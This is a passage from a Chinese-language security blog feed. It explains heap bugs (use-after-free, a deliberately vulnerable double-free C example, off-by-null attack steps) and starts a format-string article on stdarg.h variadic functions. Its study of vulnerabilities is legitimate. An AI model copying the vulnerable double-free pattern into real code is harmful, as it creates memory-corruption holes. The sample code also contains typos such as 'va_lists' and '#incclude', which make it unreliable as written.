&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;在该例子中，当buf1被释放后，该内存就立刻可以重用，之后在为buf2和buf3分配空间时可能分配了该内存。使用被释放的指针进行写操作就可能会覆盖buf2和buf3&lt;/li&gt;
&lt;li&gt;利用UAF: 覆盖控制流数据&lt;/li&gt;
&lt;li&gt;预防UAF: 将被释放的指针设置为NULL&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;双重释放double-free&#34;&gt;双重释放(Double Free)
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;示例：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;buf1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BUFSIZE1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BUFSIZE2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;strbncpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BUFSIZE2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;代码工作：
&lt;ul&gt;
&lt;li&gt;释放buf1，然后分配buf2
&lt;ul&gt;
&lt;li&gt;buf2可能占用buf1相同的内存空间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;buf2获取用户提供的数据&lt;/li&gt;
&lt;li&gt;再次释放buf1
&lt;ul&gt;
&lt;li&gt;其中可能使用一些buf2数据作为元数据&lt;/li&gt;
&lt;li&gt;并且可能打乱buf2的元数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;然后是buf2，此时使用了混乱的元数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;双重释放可以达到与堆溢出漏洞类似的效果，可以使用类似的方式预防&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;空字节溢出off--by-null&#34;&gt;空字节溢出(Off- by-Null)
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;堆溢出一字节: 将缓冲区改为0&lt;/li&gt;
&lt;li&gt;利用方式: 将P从1改写为0
&lt;ul&gt;
&lt;li&gt;这将导致前一个块被视为空闲&lt;/li&gt;
&lt;li&gt;下一个块的释放会将空闲块合并&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;攻击流程：
&lt;ul&gt;
&lt;li&gt;分配内存，定位地址&lt;/li&gt;
&lt;li&gt;空字节溢出&lt;/li&gt;
&lt;li&gt;断链&lt;/li&gt;
&lt;li&gt;写入覆盖&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>格式化字符串</title>
        <link>https://example.com/p/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</link>
        <pubDate>Fri, 11 Jul 2025 22:00:00 +0800</pubDate>
        
        <guid>https://example.com/p/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</guid>
        <description>&lt;h1 id=&#34;format-string&#34;&gt;Format string
&lt;/h1&gt;&lt;h2 id=&#34;前置知识可变参数函数&#34;&gt;前置知识：可变参数函数
&lt;/h2&gt;&lt;h3 id=&#34;处理可变参数函数的头文件stdargh&#34;&gt;处理可变参数函数的头文件：&lt;code&gt;stdarg.h&lt;/code&gt;
&lt;/h3&gt;&lt;h4 id=&#34;核心组件&#34;&gt;核心组件：
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;类型定义&lt;code&gt;va_list&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;作用：保存可变参数信息的上下文对象（本质是指向参数栈的指针）&lt;/li&gt;
&lt;li&gt;用法：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;va_list&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//声明参数变量列表
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;宏函数
&lt;ul&gt;
&lt;li&gt;va_start
&lt;ul&gt;
&lt;li&gt;作用：初始化va_list，使其指向第一个可变参数&lt;/li&gt;
&lt;li&gt;访问参数前必须调用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;va_arg
&lt;ul&gt;
&lt;li&gt;作用：获取当前参数的值（返回值），并且移动至下一个参数&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;va_end
&lt;ul&gt;
&lt;li&gt;作用：清理va_list资源&lt;/li&gt;
&lt;li&gt;访问结束后必须调用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;va_copy(C99新增)
&lt;ul&gt;
&lt;li&gt;作用：复制va_list的当前状态&lt;/li&gt;
&lt;li&gt;用于嵌套访问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;示例代码：
&lt;ul&gt;
&lt;li&gt;实现自定义的printf函数&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt;&lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdarg.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;my_printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;...)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;va_lists&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;arg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;va_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;%&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt;&lt;span class=&#34;sc&#34;&gt;&amp;#39;d&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;va_arg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  &lt;span class=&#34;nf&#34;&gt;print_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt;&lt;span class=&#34;sc&#34;&gt;&amp;#39;s&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;vaarg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  &lt;span class=&#34;nf&#34;&gt;print_str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;nf&#34;&gt;putchar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;va_end&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;实现多加数加法&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#incclude&amp;lt;stdarg.h&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;add_multiple_values&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argcount&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;...)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
